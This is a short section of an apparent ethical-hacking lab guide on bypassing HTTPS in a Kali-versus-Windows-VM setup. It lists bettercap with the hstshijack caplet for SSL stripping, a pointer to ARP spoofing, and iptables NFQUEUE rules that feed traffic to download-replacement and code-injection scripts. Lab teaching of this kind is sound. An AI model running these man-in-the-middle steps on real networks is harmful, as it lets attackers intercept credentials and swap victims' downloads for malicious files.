# Section 10: Bypassing HTTPS

First, fix permissions of virtual network adapter as documented in [VMWare KB](https://kb.vmware.com/s/article/287).
Quick fix:
```bash
chmod a+rw /dev/vmnet*
```

To enable `SSLstrip` successor `bettercap`, type following in Kali machine:
```bash
bettercap -iface eth0 -caplet hstshijack/hstshijack
```

Next enable `arp_spoof` from section-5, as HTTPS downgrade is executed against Windows VM.

Enable NF queue in Kali machine:
```shell
iptables -I OUTPUT -j NFQUEUE --queue-num 0
iptables -I INPUT -j NFQUEUE --queue-num 0
```

Now you can run `replace_downloads` or `code_injector`.

## NOTES

* `replace_downloads` script uses port 8080 comparing to original script.
* `code_injector` script uses port 8080 and downgrades HTTP to 1.0 comparing to original script.
* Remove NF queue when done:
    ```shell
    iptables --flush
    ```